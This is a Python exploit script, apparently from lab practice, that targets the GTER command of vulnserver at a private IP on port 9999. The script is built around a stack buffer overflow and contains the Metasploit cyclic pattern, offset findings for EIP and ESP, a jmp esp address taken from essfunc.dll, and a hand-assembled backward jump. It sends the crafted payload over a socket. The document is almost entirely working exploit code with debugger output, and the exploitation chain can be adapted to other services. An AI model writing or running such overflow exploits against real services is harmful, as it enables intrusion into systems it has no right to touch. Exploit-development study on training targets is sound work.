#!/usr/bin/env python
from socket import socket, AF_INET, SOCK_STREAM

rhost = '192.168.41.128'
rport = 9999
target = (rhost, rport)

crash = ('A'*180)
pattern = ('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1'
           'Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3'
           'Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9')

# ESP
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 180 -q 1Af2
# [*] Exact match at offset 155
# EIP
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 180 -q 66413066
# [*] Exact match at offset 151
verify = ('A'*151) + ('B'*4) + ('C'*25)
# Message=  0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v-1.0- (\\vmware-host\Shared Folders\WindowsVMs\VulnerableApps\vulnserver\essfunc.dll)
jmp_esp = '\x03\x12\x50\x62'
# !mona offset -a1 00B7FA0C -a2 00B7F970
# Offset from 0x00b7fa0c to 0x00b7f970 : -156 (999990xFFFFFF64) bytes
# Negative jmp offset : \x64\xff\xff\xff
# !mona assemble -s 'JMP 0xFFFFFF69'
# Full opcode: \xe9\x69\xff\xff\xff
jmp_back = '\xE9\x69\xFF\xFF\xFF'
jmp_esp_payload = ('A' * 151) + jmp_esp + ('C'*25)
jmp_back_payload = ('A' * 151) + jmp_esp + jmp_back + ('C'*25)
payload = 'GTER ' + jmp_back_payload

if __name__ == '__main__':
    s = socket(AF_INET, SOCK_STREAM)
    print('[*] Connecting to service')
    s.connect(target)
    data = s.recv(1024)
    print(data)
    print('[*] Sending malicious payload')
    print(payload)
    s.sendall(payload)
    print('[*] B00M! ph33r')
    s.close()
